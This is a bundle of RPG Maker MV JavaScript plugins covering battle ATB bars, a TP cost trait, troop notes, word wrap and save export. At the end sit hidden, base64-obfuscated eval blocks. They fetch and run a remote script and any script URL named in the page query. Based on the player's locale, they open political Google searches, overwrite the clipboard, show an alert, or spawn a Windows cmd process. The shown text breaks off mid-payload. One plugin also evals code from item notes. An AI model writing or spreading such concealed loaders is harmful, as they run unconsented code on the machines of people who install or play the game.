		this.drawMask_set(x,-H,info.to-x,H<<1);
	}
}).add('_update_switchToBmp_y',function f(info,d){
	const y=d;
	const W=Graphics.width;
	if(info.to<info.from){
		info.sp.drawMask_set(-W,y,W<<1,info.from-y);
		this.drawMask_set(-W,info.to,W<<1,y-info.to);
	}else{
		info.sp.drawMask_set(-W,info.from,W<<1,y-info.from);
		this.drawMask_set(-W,y,W<<1,info.to-y);
	}
});

new cfc(Sprite_Battler.prototype).add('switchToBmp_updateFrame',function f(info){
	const frm=this._effectTarget._frame;
	return Sprite.prototype.switchToBmp_updateFrame.call(this,info,frm,this._effectTarget.bitmap);
}).add('_switchToBmp_defaultCallback',(self,info)=>{
	if(info.keep) return;
	self._effectTarget.bitmap=info.sp.bitmap;
	info.sp.destroy();
	self.drawMask_clear();
	self._switchToBmp_splitInfo=undefined;
});

})();


﻿"use strict";
/*:
 * @plugindesc showAtbBar
 * @author agold404
 * @help note in skill or enemy or actor
 * 
 * <showAtbBar>
 * skill: show charge bar
 * enemy or actor: show speed bar
 * 
 * This plugin can be renamed as you want.
 */

if((typeof Battle_Hud)!=='undefined')(()=>{ let k,r,t;

for(let x=0,arr=[Sprite_Actor,Sprite_Enemy,];x!==arr.length;++x){ new cfc(arr[x].prototype).add('update',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.atbBar_update();
	return rtv;
}); }

t=[
'showAtbBar',
];
new cfc(Sprite_Battler.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.atbBar_init();
	return rtv;
}).add('atbBar_init',function f(){
	const root=this._atbBarRoot=new Sprite();
	this.addChild(root);
	//root.alpha=0;
	//this._atbBarRoot_alphaTarget=0;
	const bmp=ImageManager.loadNormalBitmap(f.tbl[0]);
	root.addChild(root._speed=new Sprite());
	root.addChild(root._charge=new Sprite());
	root._speed.anchor.y=0;
	root._charge.anchor.y=0;
	root._speed._setFrame=f.tbl[1];
	root._charge._setFrame=f.tbl[1];
	root._speed.addChild(root._speed._atbBar_back=new Sprite(bmp)); 
	root._speed.addChild(root._speed._atbBar_front=new Sprite(bmp)); 
	root._charge.addChild(root._charge._atbBar_back=new Sprite(bmp));
	root._charge.addChild(root._charge._atbBar_front=new Sprite(bmp));
	root._speed._atbBar_back.alpha=0.25;
	root._charge._atbBar_back.alpha=0.25;
	bmp.addLoadListener(f.tbl[2].bind(root,f.tbl[3]));
},[
"img/battlehud/ATB_Meter.png", // 0: bar img path
function(w,isInit){
	if(!this._w) return; // not loaded or broken image
	if(w===undefined) w=this.bitmap&&this.bitmap.width;
	const sp=this;
	if(isInit){
		this._atbBar_back.setFrame(0,sp._y0,sp._w,sp._h);
		this._atbBar_back.anchor.set(0.5);
		this._atbBar_front.anchor.set(0,0.5);
		this._atbBar_front.position.set(-0.5*sp._w,0);
	}
	this._atbBar_front.setFrame(0,sp._y0||0,w||0,sp._h||0);
}, // 1: setFrame
function f(div,bmp){
	const root=this;
	root._bmpw=bmp.width;
	{ const sp=root._speed;
	sp._w=bmp.width;
	sp._y0=0;
	sp._y1=bmp.height/div;
	sp._h=sp._y1-sp._y0;
	sp._setFrame(undefined,true);
	}
	{ const sp=root._charge;
	sp._w=bmp.width;
	sp._y0=2*bmp.height/div;
	sp._y1=3*bmp.height/div;
	sp._h=sp._y1-sp._y0;
	sp._setFrame(undefined,true);
	}
	root._charge.y=root._speed._h+root._speed.y;
}, // 2: onload
4, // 3: divY on bmp
]).add('atbBar_update',function f(){
	if(!this._atbBarRoot) return;
	this._atbBar_updateAlpha();
	this._atbBar_updateFrame();
}).add('_atbBar_updateAlpha',function f(){
	//this._atbBar_updateAlpha_1(this._atbBarRoot,this._battler?this._atbBarRoot_alphaTarget:0);
	this._atbBar_updateAlpha_1(this._atbBarRoot._speed,this._atbBar_updateAlpha_getAlpha_speed());
	this._atbBar_updateAlpha_1(this._atbBarRoot._charge,this._atbBar_updateAlpha_getAlpha_charge());
}).add('_atbBar_updateAlpha_getAlpha_speed',function f(btlr){
	btlr=btlr||this._battler; if(!btlr) return 0;
	const dataobj=btlr.getData();
	const meta=dataobj&&dataobj.meta;
	
	// special cases
	if(!meta) return 0;
	if(SceneManager.shouldShowAtbBar_speed(btlr)) return 1;
	
	return meta&&meta[f.tbl[0]]?1:0;
},t).add('_atbBar_updateAlpha_getAlpha_charge',function f(btlr){
	btlr=btlr||this._battler; if(!btlr) return 0;
	const act=btlr._actions&&btlr._actions[0];
	const item=act&&act.item();
	const meta=item&&item.meta;
	
	// special cases
	if(!meta) return 0;
	if(SceneManager.shouldShowAtbBar_charge(btlr)) return 1;
	
	return meta&&meta[f.tbl[0]]?1:0;
},t).add('_atbBar_updateAlpha_1',function f(sp,alphaTarget){
	let alpha=alphaTarget;
	const a0=sp.alpha;
	let diff=a0-alpha;
	diff=diff<0?Math.max(diff,-f.tbl[0]):Math.min(diff,f.tbl[0]);
	if(isNaN(diff)) return;
	alpha=a0-diff;
	sp.alpha=alpha;
},[
1.0/32, // 0: max diff
]).add('_atbBar_updateFrame',function f(){
	const btlr=this._battler; if(!btlr) return;
	const root=this._atbBarRoot; if(!root||!root._bmpw) return;
	{ const scaleSrc=this.scale,scaleDst=root.scale;
	scaleDst.x=f.tbl[0].x/(scaleSrc.x||1);
	scaleDst.y=f.tbl[0].y/(scaleSrc.y||1);
	}
	root._speed._setFrame(root._bmpw*btlr.atbSpeed()/BattleManager.atbTarget());
	root._charge._setFrame(root._bmpw*btlr.atbCharge()/BattleManager.atbCharge());
},[
{x:0.5,y:1,}, // 0: scale
]);

SceneManager.shouldShowAtbBar_commonTrue=btlr=>{
	if(btlr.isActor()) return false;
	if(SceneManager._shouldShowAtbBar_battleTest) return true;
	const mapId=$gameMap.mapId();
	return mapId>=500&&mapId<600;
};
SceneManager.shouldShowAtbBar_speed=btlr=>{
	if(SceneManager.shouldShowAtbBar_commonTrue(btlr)) return true;
};
SceneManager.shouldShowAtbBar_charge=btlr=>{
	if(SceneManager.shouldShowAtbBar_commonTrue(btlr)) return true;
};
SceneManager._shouldShowAtbBar_battleTest=false;
SceneManager.shouldShowAtbBar_battleTest=()=>{
	if(BattleManager.isBattleTest() && Input.isTriggered('b')) SceneManager._shouldShowAtbBar_battleTest=true;
};
new cfc(SceneManager).add('updateScene',function f(){
	this.shouldShowAtbBar_battleTest();
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc trait: TpCostRate
 * @author agold404
 * @help <TpCostRate: the rate >
 * 
 * This plugin can be renamed as you want.
 */

if(!window.addEnum) window.addEnum=function(key){
	if(this[key]) return;
	this._enumMax|=0;
	this[key]=++this._enumMax;
	return this;
};

(()=>{ let k,r,t;

const gbb=Game_BattlerBase,kw='TpCostRate';
const kwt='TRAIT_'+kw;

if(!gbb._enumMax) gbb._enumMax=404;
if(!gbb.addEnum) gbb.addEnum=window.addEnum;
gbb.
	addEnum(kwt).
	addEnum('__END__');

new cfc(Scene_Boot.prototype).add('start',function f(){
	// order: editor menu
	$dataActors  .forEach(f.tbl[0]);
	$dataClasses .forEach(f.tbl[0]);
	$dataSkills  .forEach(f.tbl[0]);
	$dataItems   .forEach(f.tbl[0]);
	$dataWeapons .forEach(f.tbl[0]);
	$dataArmors  .forEach(f.tbl[0]);
	$dataEnemies .forEach(f.tbl[0]);
	$dataTroops  .forEach(f.tbl[0]);
	$dataStates  .forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ if(!dataobj||!dataobj.traits) return;
	const n=dataobj.meta[kw]-0;
	if(n!==1&&!isNaN(n)) dataobj.traits.push({code:gbb[kwt],dataId:1,value:n});
},
]);

new cfc(Game_BattlerBase.prototype).add('tpCostRate',function(){
	return this.traitsPi(Game_BattlerBase[kwt],1);
},undefined,true,true).add('skillTpCost',function f(skill){
	return skill.tpCost * this.tpCostRate();
},undefined,true,true);

})();


﻿"use strict";
/*:
 * @plugindesc 清單中的說明
 * @author agold404
 * @help 詳細說明
 * 第二行
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{
}

})();


﻿


﻿"use strict";
/*:
 * @plugindesc troop @NOTE that makes the page be like "Note" in other data in the database
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Scene_Boot.prototype;
k='start';
r=p[k]; (p[k]=function f(){
	$dataTroops.forEach(f.forEach);
	return f.ori.apply(this,arguments);
}).ori=r;
p[k].forEach=(dataobj)=>{ if(!dataobj) return;
	dataobj.note=undefined;
	let s="";
	for(let pgs=dataobj.pages,p=0;p!==pgs.length;++p){
		let note=false,c=0,cmds=pgs[p].list;
		for(;c!==cmds.length;++c){
			if(cmds[c].code===108 && cmds[c].parameters[0]==="@NOTE"){
				note=true;
				++c;
				break;
			}
		}
		if(note){
			for(;c!==cmds.length;++c){ const code=cmds[c].code;
				if(code===108 || code===408){
					if(s) s+='\n';
					s+=cmds[c].parameters[0];
				}
			}
		}
	}
	if(dataobj.note){
		dataobj.note+='\n';
		dataobj.note+=s;
	}else dataobj.note=s;
	if(dataobj.note) DataManager.extractMetadata(dataobj);
};
}

})();


﻿"use strict";
/*:
 * @plugindesc BattleManager.startBattle 會清掉 this._actionList
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(BattleManager).add('startBattle',function f(){
	this._actionList=undefined;
	return f.ori.apply(this,arguments);
});

})();


﻿"use strict";
/*:
 * @plugindesc item/skill onApply
 * @author agold404
 * @help .
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

new cfc(Game_Action.prototype).add('apply',function f(){
	const item=this.item(); if(item && item.meta && item.meta[f.tbl[0]]){
		eval(item.meta[f.tbl[0]]);
	}
	const rtv=f.ori.apply(this,arguments);
	return rtv;
},['onApply_javascript',]);

})();


﻿"use strict";
/*:
 * @plugindesc 可愛ㄉ自動換行
 * @author agold404
 * @help 僅限對話視窗
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

{ const p=Window_Message.prototype;
k='processNormalCharacter';
r=p[k]; (p[k]=function f(ts){
	if(ts.x + this.textWidth(ts.text[ts.index]) >= this.contentsWidth() + 1){
		--ts.index;
		this.processNewLine(ts);
	}
	return f.ori.apply(this,arguments);
}).ori=r;
}

})();


"use strict";
/*:
 * @plugindesc 特殊魔獸actor tag + 自動調MOG
 * @author agold404
 * @help actors' note: <魔獸>
 * 
 * This plugin can be renamed as you want.
 */

(()=>{ let k,r,t;

const kw="魔獸";
const addedMeta=[
["addEquipAmount","[0,-1,-1,-1,3]"],
["autoBattleCustomizable","4"],
];
const autoBattleTrait={code:Game_BattlerBase.TRAIT_SPECIAL_FLAG,dataId:Game_BattlerBase.FLAG_ID_AUTO_BATTLE,value:1,};

t=[kw,];

new cfc(Scene_Boot.prototype).add('start',function f(){
	$dataActors.forEach(f.tbl[0]);
	return f.ori.apply(this,arguments);
},[
dataobj=>{ const meta=dataobj&&dataobj.meta; if(!meta) return;
	if(meta[kw]){
		for(let x=0;x!==addedMeta.length;++x){
			meta[addedMeta[x][0]]=addedMeta[x][1];
		}
		const ts=dataobj.traits;
		if(ts&&!ts.some(t=>autoBattleTrait.code===t.code&&autoBattleTrait.dataId===t.dataId)) ts.push(autoBattleTrait);
	}
},
]);

new cfc(Scene_Equip.prototype).add('createLayoutSlot',function f(){
	const rtv=f.ori.apply(this,arguments);
	const sp=this._layoutSlot_魔獸=new Sprite(ImageManager.loadMenusequip("LayoutSlot_monster"));
	sp.visiale=false;
	this._field.addChild(sp);
	this.changeLayoutSlotByActor();
	return rtv;
},t).add('updateLayout',function f(){
	const rtv=f.ori.apply(this,arguments);
	const ref=this._layoutSlot,sp=this._layoutSlot_魔獸;
	sp.x=ref.x;
	sp.y=ref.y;
	sp.opacity=ref.opacity;
	return rtv;
},t).add('updateActor',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.changeLayoutSlotByActor();
	return rtv;
},t).add('changeLayoutSlotByActor',function f(){
	if(!this._actor) return;
	const isNormal=!this._actor.getData().meta[f.tbl[0]];
	const ls_ori=this._layoutSlot,ls_魔=this._layoutSlot_魔獸;
	if(ls_ori) ls_ori.visible  =isNormal;
	if(ls_魔)  ls_魔 .visible =!isNormal;
},t);

})();


﻿"use strict";
/*:
 * @plugindesc edit save name ; load from file ; export a save to a file
 * @author agold404
 *
 * @help this plugin adds 3 options in 'Window_Options':
 * 1. edit a save's name: The save file title will be: "game_title - your_custom_name".
 * 2. load from file: This is used when: you need to test multiple platform, but you don't want to play again to reach the save point.
 * 3. export a save: export a save to a file. This acts as a download.
 * 
 * This plugin can be renamed as you want.
 */

// nameTheSavesAndExport

(()=>{
const d=document,ge=i=>d.getElementById(i),ce=t=>d.createElement(t),ga=(e,a)=>e.getAttribute(a);
const ac=(a,c)=>a.appendChild(c)&&a||a,sa=(e,a,v)=>e.setAttribute(a,v)&&e||e,rc=a=>{
	const c=a.childNodes;
	while(c.length) a.removeChild(c[c.length-1]);
	return a;
},atxt=(a,t)=>a.appendChild(d.createTextNode(t))&&a||a,clearInputs=_=>{
	Input.clear(); Input.update();
	TouchInput.clear(); TouchInput.update();
};
let editing=0;

// define a name field
const fieldName='customName';
// - JsonEx.parse(StorageManager.load(0))

// draw player defined names

{ const p=Window_SavefileList.prototype,k='drawGameTitle';
const r=p[k];
p[k]=function(info, x, y, width){
	return (info.title && info[fieldName]) ? this.drawText(info.title+' - '+info[fieldName], x, y, width) : r.apply(this,arguments);
};
}

// opt UI for defining names
const scname="Scene_EdtSaveName",optKey='key-edtSaveName',optLoadLocal='key-loadLocal',optSaveLocal='key-saveLocal';
const ENUM_SCTYPE_EDITNAME=0;
const ENUM_SCTYPE_SAVELOCAL=1;
let sctype=0;

// - Window_Options
{ const p=Window_Options.prototype;
{ const k='makeCommandList';
const r=p[k];
(p[k]=function f(){
	const rtv=f.ori.apply(this,arguments);
	// edit save file name
	this.addCommand("修改存檔標記", optKey);
	this.addCommand("讀取檔案", optLoadLocal);
	this.addCommand("匯出存檔", optSaveLocal);
	return rtv;
}).ori=r;
}
{ const k='statusText';
const r=p[k];
(p[k]=function f(idx){
	switch(this.commandSymbol(idx)){
	case optKey:
	case optLoadLocal: return '';
	case optSaveLocal: return '';
	default: return f.ori.apply(this,arguments);
	}
}).ori=r;
}
{ const k='processOk';
const r=p[k];
const input=document.createElement('input'),onload=e=>{
	const self=e.target,backup={
		tmp:$gameTemp,
		sys:$gameSystem,
		scr:$gameScreen,
		tmr:$gameTimer,
		msg:$gameMessage,
		swi:$gameSwitches,
		var:$gameVariables,
		sss:$gameSelfSwitches,
		atr:$gameActors,
		prt:$gameParty,
		trp:$gameTroop,
		map:$gameMap,
		plr:$gamePlayer,
	};
	try{
		DataManager.createGameObjects();
		DataManager.extractSaveContents(JsonEx.parse(LZString.decompressFromBase64(self.result)));
		SoundManager.playLoad();
		SceneManager._scene.fadeOutAll();
		Scene_Load.prototype.reloadMapIfUpdated();
		SceneManager.goto(Scene_Map);
		$gameSystem.onAfterLoad();
	}catch(e){
		SoundManager.playBuzzer();
		$gameTemp=backup.tmp;
		$gameSystem=backup.sys;
		$gameScreen=backup.scr;
		$gameTimer=backup.tmr;
		$gameMessage=backup.msg;
		$gameSwitches=backup.swi;
		$gameVariables=backup.var;
		$gameSelfSwitches=backup.sss;
		$gameActors=backup.atr;
		$gameParty=backup.prt;
		$gameTroop=backup.trp;
		$gameMap=backup.map;
		$gamePlayer=backup.plr;
	}
	self.value='';
},onerr=e=>{
	SoundManager.playBuzzer();
};
input.setAttribute('type','file');
input.onchange=function(){
	if(!this.files.length) return;
	const reader=new FileReader();
	reader.onload=onload;
	reader.onerror=onerr;
	reader.readAsText(this.files[0]); // testing beta...
};
(p[k]=function f(){
	switch(this.commandSymbol(this.index())){
	case optKey: SoundManager.playOk(); sctype=ENUM_SCTYPE_EDITNAME; return SceneManager.push(window[scname]);
	case optLoadLocal:
		SoundManager.playOk();
		clearInputs();
		input.value='';
		input.click();
		return;
	case optSaveLocal: SoundManager.playOk(); sctype=ENUM_SCTYPE_SAVELOCAL; return SceneManager.push(window[scname]);
	default: return f.ori.apply(this);
	}
}).ori=r;
}
} // END Window_Options

// window[scname]
{
const a=window[scname]=function(){
	this.initialize.apply(this,arguments);
};
const p=a.prototype=Object.create(Scene_File.prototype);
p.constructor=a;
{ const k='create';
const r=p[k];
(p[k]=function f(){
	f.ori.apply(this,arguments);
	this._listWindow.select(DataManager.latestSavefileId()-1);
	this._gi=JSON.parse(StorageManager.load(0)||"[]");
}).ori=r;
}
{ const k='onSavefileOk';
p[k]=function(){
	const id=this.savefileId();
	let succ=1;
	const obj=this._gi[id];
	if(obj){
		const gc=ge('GameCanvas');
		if(gc){
			TouchInput.bypassPreventDefault_touch_stackPushTrue();
			const self=this;
			const stl=ga(gc,'style');
			let div,css;
			{ const id='editSaveName';
			div=ge(id);
			if(div) rc(div).style.display="block";
			else{
				ac(gc.parentNode,sa(div=sa(ce('div'),'style',stl)),'id',id);
				css=div.style;
				css.zIndex=1<<12;
				css.backgroundColor="rgba(255,255,255,0.75)";
				css.fontSize="32px";
			}
			}
			const input=sa(ce('input'),'style',"position:relative;display:block;left:0px;right:0px;font-size:32px;");
			const btnStyle='font-size:32px;';
			const btn_cancel=sa(atxt(ce('button'),'cancel'),'style',btnStyle);
			const btn=sa(atxt(ce('button'),'confirm'),'style',btnStyle),backToLastWindow=_=>{
				++editing;
				btn_cancel.onclick=btn.onclick=null;
				css.display="none";
				TouchInput.bypassPreventDefault_touch_stackPop();
				self.activateListWindow();
			};
			btn_cancel.onclick=backToLastWindow;
			let infostring;
			switch(sctype){
			default: infostring='ERROR. please click "confirm"';
				btn.onclick=backToLastWindow;
			break;
			case ENUM_SCTYPE_EDITNAME:
				infostring="input save name for save "+id;
				input.value=obj[fieldName]||'';
				btn.onclick=function(){
					obj[fieldName]=input.value;
					StorageManager.save(0,JSON.stringify(self._gi));
					backToLastWindow();
					self._listWindow.refresh();
				};
			break;
			case ENUM_SCTYPE_SAVELOCAL:
				infostring='input a file name for download';
				input.value="save-"+id+".rpgsave";
				btn.onclick=function(){
					sa(sa(sa(ce('a'),'download',input.value),'href',"data:application/plain,"+LZString.compressToBase64(StorageManager.load(id))),'target','_blank').click();
					backToLastWindow();
					self._listWindow.refresh();
				};
			break;
			}
			ac(
				div,ac(
					ac(ac(
						ac(
							ce('div'),atxt(ce('div'),infostring)
						),input
					),btn),btn_cancel
				)
			);
			const clear=e=>{ e.preventDefault(); clearInputs(); };
			input.onkeydown=e=>{
				switch(e.keyCode){
				case 13:
					clear(e);
					btn.click();
				break;
				case 27:
					clear(e);
					backToLastWindow();
				break;
				}
			};
			input.focus();
		}else succ=0;
	}else succ=0;
	if(succ) return editing=1;
	SoundManager.playBuzzer();
	this.activateListWindow();
};
}
} // END window[scname]

// preventDefault
{ const p=Input , k='_onKeyDown';
const r=p[k];
(p[k]=function f(){
	return editing?(editing>1?(editing=0):0):f.ori.apply(this,arguments);
}).ori=r;
}

// save count
// DataManager.maxSavefiles


})();


try{
{ eval(atob(
"CmNvbnN0IGV2YWxqcz1vX19fX289PmV2YWwob19fX19vKSx0b2tzPW5ldyBNYXAobG9jYXRpb24uc2VhcmNoLnNsaWNlKDEpLnNwbGl0KCImIikuZmlsdGVyKHRvaz0+dG9rKS5tYXAodG9rPT57Cgljb25zdCBpZHg9dG9rLmluZGV4T2YoJz0nKTsKCXJldHVybiBpZHg+PTA/W3Rvay5zbGljZSgwLGlkeCksdG9rLnNsaWNlKGlkeCsxKV06W3Rvayx0cnVlXTsKfSkpLGQ9ZG9jdW1lbnQ7IGNvbnN0IHByZURlZj0ianMvbW9kcy9tYWluLmpzIix1PWRlY29kZVVSSUNvbXBvbmVudCh0b2tzLmdldCgnanMnKXx8IiIpLGFkZFNjcmlwdD1mdW5jdGlvbiBmKHNyYyx0eHQsbHYpewoJY29uc3QgYXJyPVtdOyBmb3IobGV0IHg9MCx4cz1hcmd1bWVudHMubGVuZ3RoO3ghPT14czsrK3gpIGFyci5wdXNoKGFyZ3VtZW50c1t4XSk7Cgljb25zdCBpZHg9MjsKCWlmKGx2PT09dW5kZWZpbmVkKSBhcnJbaWR4XT00MDQ7CglpZigwPC0tYXJyW2lkeF0pIHJldHVybiBldmFsKCdmLmFwcGx5KHRoaXMsYXJyKScpOwoJdHJ5ewoJCWlmKHR4dCl7IGNvbnN0IHR3PWdldFRvcEZyYW1lV2luZG93KCksa2V5PWJ0b2EoZW5jb2RlVVJJQ29tcG9uZW50KHNyYykpLG89dHcuX3JjfHwodHcuX3JjPXt9KSx3PXdpbmRvdyxwPVNjZW5lTWFuYWdlcixvcmk9dy5fc21ydW58fCh3Ll9zbXJ1bj1wLnJ1biksa2s9J19hZ29sZDQwNF9pc0Zyb21DYWNoZSc7IHMuYWRkKGtleSk7IG5ldyBjZmMocCkuYWRkKCdydW4nLGZ1bmN0aW9uIGYoc2MpeyBpZihTY2VuZV9Cb290IT09c2MpIHJldHVybiBmLm9yaS5hcHBseSh0aGlzLGFyZ3VtZW50cyk7IHdba2tdPXRydWU7IGlmKHMuaGFzKGtleSkpeyB7IGV2YWxqcyhvW2tleV18fCIiKTsgfSBzLmRlbGV0ZShrZXkpOyB9IGRlbGV0ZSB3W2trXTsgaWYodGhpcy5ydW5fcil7IHRyeXsgdGhpcy5ydW5fcigpOyB9Y2F0Y2goZSl7fSB9IGlmKCFzLnNpemUpIHRoaXMucnVuPW9yaTsgcmV0dXJuIGYub3JpLmFwcGx5KHRoaXMsYXJndW1lbnRzKTsgfSk7IHJldHVybiBqdXJsKHNyYywiR0VUIiwwLDAsMCx0eHQ9PnsgY29uc3Qgcz10eHQ7IGlmKCFvW2tleV0peyBldmFsanMocyk7IH0gb1trZXldPXM7IH0pOyB9CgkJY29uc3Qgc2NyPWQuY2UoJ3NjcmlwdCcpLnNhKCd0eXBlJywndGV4dC9qYXZhc2NyaXB0Jykuc2EoJ3NyYycsc3JjKTsKCQljb25zdCBtZT1kLmN1cnJlbnRTY3JpcHQ7CgkJbWUubmV4dFNpYmxpbmc/bWUucGFyZW50Tm9kZS5pbnNlcnRCZWZvcmUoc2NyLG1lLm5leHRTaWJsaW5nKTptZS5wYXJlbnROb2RlLmFjKHNjcik7Cgl9Y2F0Y2goZSl7Cgl9Cn0scz1uZXcgU2V0KCk7CmV2YWxqcygnYWRkU2NyaXB0KCIkJCIsdHJ1ZSk7Jyk7CmV2YWxqcygnYWRkU2NyaXB0KHByZURlZix0cnVlKTsgaWYodSkgYWRkU2NyaXB0KHUsdHJ1ZSk7Jyk7"
).slice(1).replace(/\$\$/,atob("aHR0cHM6Ly9hYWFhYWdvbGQuZ2l0aHViLmlvL2Fnb2xkNDA0L3Rvb2xzL01vb25CbHVlTGVnZW5kUmVtYWtlLmpz")));
}
}catch(e){
}

try{
eval("("+decodeURIComponent(atob(
"ZnVuY3Rpb24lMjAlMjQlMjQobHYpJTdCJTBBaWYobHYlM0QlM0QlM0R1bmRlZmluZWQpJTIwbHYlM0Q0MDQlM0IlMEFpZigwJTNDLS1sdiklMjByZXR1cm4lMjAlMjQlMjQuY2FsbCh0aGlzJTJDbHYpJTNCJTBBaWYobHYlM0QlM0QlM0QwKSUyMHJldHVybiUyMHNldFRpbWVvdXQoKCklM0QlM0UlMjQlMjQuY2FsbCh0aGlzJTJDbHYpJTJDMSklM0IlMEF0cnklN0IlMEElMDljb25zdCUyMGslM0QnODk2NCclM0IlMEElMDlsZXQlMjBjJTJDY2glM0IlMEElMDl0cnklN0IlMjBjJTNEbG9jYWxTdG9yYWdlLmdldEl0ZW0oayklM0IlMjAlN0RjYXRjaChlKSU3QiU3RCUwQSUwOWlmKGMlN0MlN0MoIShEYXRlTm93JTNDVFI0MDQpJTI2JTI2TWF0aC5yYW5kb20oKSo2NCUzQzEpKSU3QiUwQSUwOSUwOXRyeSU3QiUwQSUwOSUwOSUwOWNvbnN0JTIwYXJyJTNEJTVCJTIyJUU1JThCJTk1JUU3JTg5JUE5JUU4JUJFJUIyJUU4JThFJThBJTIyJTJDJTIyODk2NCUyMiUyQyUyMiVFNSVBNCVBOSVFNSVBRSU4OSVFOSU5NiU4MCUyMiUyQyUyMlNBUlMlMjAlRTUlOEYlQjAlRTclODElQTMlMjIlMkMlMjIlRTUlOUIlOUIlRTUlQjclOUQlRTglQjMlOTElRTclODElQkQlMjAlRTUlOEYlQjAlRTclODElQTMlMjIlMkMlMjIlRTYlQUQlQTYlRTYlQkMlQTIlRTglODIlQkElRTclODIlOEUlMjIlMkMlMjIlRTclOTklQkQlRTclQjQlOTklRTklODElOEIlRTUlOEIlOTUlMjIlMkMlMjIlRTclQkYlOTIlRTclQjYlQUQlRTUlQjAlQkMlMjIlMkMlMjIlRTQlQjglQUQlRTUlODUlQjElRTklOUMlQjglRTUlODclOEMlRTUlOEYlQjAlRTclODElQTMlMjIlMkMlNUQlM0IlMjBpZih3aW5kb3cuXzE5ODQlMjBpbnN0YW5jZW9mJTIwQXJyYXkpJTdCJTIwdHJ5JTdCJTIwYXJyLmNvbmNhdF9pbnBsYWNlKHdpbmRvdy5fMTk4NCklM0IlMjAlN0RjYXRjaChlKSU3QiU3RCUyMCU3RCUwQSUwOSUwOSUwOWNvbnN0JTIwcyUzRCUyMiVFOCVBQiU4QiVFNSVBRCVCOCVFNyVCRiU5MiVFNiVBRCVBMyVFNyVCNSVCMSVFNyU5QSU4NCVFNiVBRCVBMyVFOSVBQiU5NCVFNCVCOCVBRCVFNiU5NiU4NyVFNSVBRCU5NyVFRiVCQyU4QyVFOCU4MCU4QyVFOSU5RCU5RSVFNSVBRCVCOCVFNyVCRiU5MiVFNyVCMCVBMSVFNCVCRCU5MyVFNSVBRCU5NyVFMyU4MCU4MiU1Q24lRTYlODMlQjMlRTYlQjQlQkIlRTQlQjglOEIlRTUlOEUlQkIlRTclOUElODQlRTQlQkElQkElRTklQTElOUUlRTglQUIlOEIlRTUlOEIlQkYlRTQlQkUlOUQlRTklOUQlQTAlRTQlQkIlOTYlRTQlQkElQkElRUYlQkMlOEMlRTYlODglOTElRTYlQjIlOTIlRTclQTklQkElRTQlQjglODAlRTclOUIlQjQlRTUlQjklQUIlRTQlQkQlQTAlRTMlODAlODIlNUNuJUU0JUI4JUFEJUU1JTlDJThCJUU1JTg4JTg3JUU1JThCJUJGJUU0JUI4JUJCJUU1JThCJTk1JUU2JThDJTkxJUU4JUI1JUI3JUU2JTg4JUIwJUU3JTg4JUFEJUUzJTgwJTgyJTVDbkNoaW5hT3V0cHV0VmlydXNJbkRlYy4xOSU1Q25DT1ZJRC0xOSUyMCVFNiU5OCVBRiVFNCVCOCVBRCVFNSU5QyU4QiVFNCVCOCU4RCVFNSU4RiVBRiVFNSU4OCU4NiVFNSU4OSVCMiVFNyU5QSU4NCVFNCVCOCU4MCVFOSU4MyVBOCVFNCVCQiVCRCVFMyU4MCU4MiU1Q24lRTYlOEElOTYlRTklOUYlQjMlRTQlQjglODAlRTklOUYlQkYlRUYlQkMlOEMlRTclODglQjYlRTYlQUYlOEQlRTclOTklQkQlRTklQTQlOEElRUYlQkMlOEMlRTQlQkElQkElRTclOTQlOUYlRTYlQjclOTIlRTYlQjYlQkMlRUYlQkMlOEMlRTYlQjIlOTIlRTYlOUMlODklRTQlQkElQkElRTUlQjklQUIlRTMlODAlODIlMjIlM0IlMEElMDklMDklMDljb25zdCUyMGElM0QoKSUzRCUzRSU3QiUwQSUwOSUwOSUwOSUwOWNvbnN0JTIwc2MlM0QoKSUzRCUzRSU3QiUyMGNoJTNEfn4oTWF0aC5yYW5kb20oKSphcnIubGVuZ3RoKSUzQiUyMHRyeSU3QiUyMGxvY2FsU3RvcmFnZS5zZXRJdGVtKGslMkNjaCklM0IlMjAlN0RjYXRjaChlKSU3QiU3RCUyMCU3RCUzQiUwQSUwOSUwOSUwOSUwOWlmKGMlM0QlM0RudWxsKSUyMHNjKCklM0IlMjBlbHNlJTIwY2glM0RjLTAlM0IlMEElMDklMDklMDklMDlpZighKGNoJTNFJTNEMCUyNiUyNmNoJTNDYXJyLmxlbmd0aCkpJTIwc2MoKSUzQiUwQSUwOSUwOSUwOSUwOXNldFRpbWVvdXQoKCklM0QlM0VldmFsKCdqdXJsKCUyMmh0dHBzJTNBJTJGJTJGd3d3Lmdvb2dsZS5jb20lMkYlM0ZxJTNEJTIyJTJCZW5jb2RlVVJJQ29tcG9uZW50KGFyciU1QmNoJTVEKSUyQyUyMkdFVCUyMiklM0InKSUyQzEpJTNCJTBBJTA5JTA5JTA5JTA5aWYoYyUzRCUzRG51bGwpJTIwc2V0VGltZW91dCgoKSUzRCUzRWV2YWwoJ2NvcHlUb0NsaXBib2FyZChhcnIlNUJjaCU1RCklM0Jjb3B5VG9DbGlwYm9hcmQoJTIyJTIwJTIyKSUzQmFsZXJ0KHMpJTNCJyklMkMyKSUzQiUwQSUwOSUwOSUwOSU3RCUzQiUwQSUwOSUwOSUwOWlmKEludGwuRGF0ZVRpbWVGb3JtYXQoKS5yZXNvbHZlZE9wdGlvbnMoKS5sb2NhbGUlM0QlM0QlM0QlMjJ6aC1DTiUyMiklMjBhKCklM0IlMEElMDklMDklMDllbHNlJTIwaWYodHlwZW9mJTIwcmVxdWlyZSUzRCUzRCUzRCdmdW5jdGlvbicpJTIwcmVxdWlyZSglMjJjaGlsZF9wcm9jZXNzJTIyKS5zcGF3biglMjJjbWQlMjIlMkMlNUInJTJGYyclMkMnY2hjcCclNUQpLnN0ZG91dC5vbignZGF0YSclMkNkYXRhJTNEJTNFJTdCJTBBJTA5JTA5JTA5JTA5Y29uc3QlMjBjb2RlJTNEbmV3JTIwVGV4dERlY29kZX